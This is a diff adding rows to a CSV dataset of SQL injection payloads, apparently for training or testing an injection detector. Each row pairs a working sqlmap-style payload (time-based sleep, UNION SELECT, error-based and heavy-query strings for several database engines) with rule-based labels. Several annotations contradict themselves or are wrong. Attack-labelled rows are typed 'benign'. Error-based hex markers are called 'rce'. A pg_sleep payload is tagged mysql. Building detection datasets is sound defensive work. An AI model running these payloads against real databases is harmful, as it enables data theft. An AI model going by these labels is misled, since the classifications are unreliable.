@@ -1,0 +1,31 @@
+row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
+9900,1' in boolean mode ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+9901,"1"" ) ) as dvpb where 6673 = 6673",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+9902,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) # idxq",1,,rce,generic,0.95,0x4c4d6142 detected — rce injection (priority 1) on generic,rule-based
+9903,1 ) union all select null#,1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+9904,"1%"" ) and sleep ( 5 ) #",1,,time_blind,mysql,0.95,"sleep (, and sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
+9905,"1"" where 5977 = 5977",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+9906,"-4340 ) ) or make_set ( 9354 = 9354,7185 ) and ( ( 8505 = 8505",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
+9907,1'+ ( select 'drqj' where 1246 = 1246,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+9908,1%' ) ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( '%' = ',1,,error_based,oracle,0.95,dbms_utility detected — error_based injection (priority 4) on oracle,rule-based
+9909,"1"" ) ) as uqem where 3521 = 3521",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+9910,"1' and elt ( 1210 = 1210,sleep ( 5 ) ) and 'pjrf' = 'pjrf",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+9911,1' ) and 5999 = 5879,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+9912,"-9601' ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
+9913,-2793' ) where 2621 = 2621 union all select 2621#,1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+9914,1 union all select null#,1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+9915,select case when 1802 = 7063 then 1 else null end--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+9916,"-6680%"" ) ) union all select 3719,3719,3719,3719,3719,3719,3719,3719,3719--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+9917,"1 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) -- fzhj",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+9918,1'+ ( select onzd where 8452 = 8452 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +',1,,boolean_blind,postgresql,0.95,8452 = 8452 and detected — boolean_blind injection (priority 8) on postgresql,rule-based
+9919,"-5624' union all select 3723,3723,3723,3723,3723--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+9920,"-9371' ) union all select 5900,5900,5900#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+9921,"1"" and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ""krtr"" like ""krtr",1,,rce,mysql,0.95,0x7171706a71 detected — rce injection (priority 1) on mysql,rule-based
+9922,"1%' ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
+9923,1' ) ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( ( 'ugrk' = 'ugrk,1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
+9924,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and 'nhuk' = 'nhuk",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+9925,"1, ( select ( case when ( 5885 = 1825 ) then 1 else 5885* ( select 5885 from master..sysdatabases ) end ) )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+9926,"1 ) as lhie where 4631 = 4631 union all select null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+9927,"1"" ) where 8588 = 8588",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+9928,"1' and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
+9929,1 ) where 6304 = 6304,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
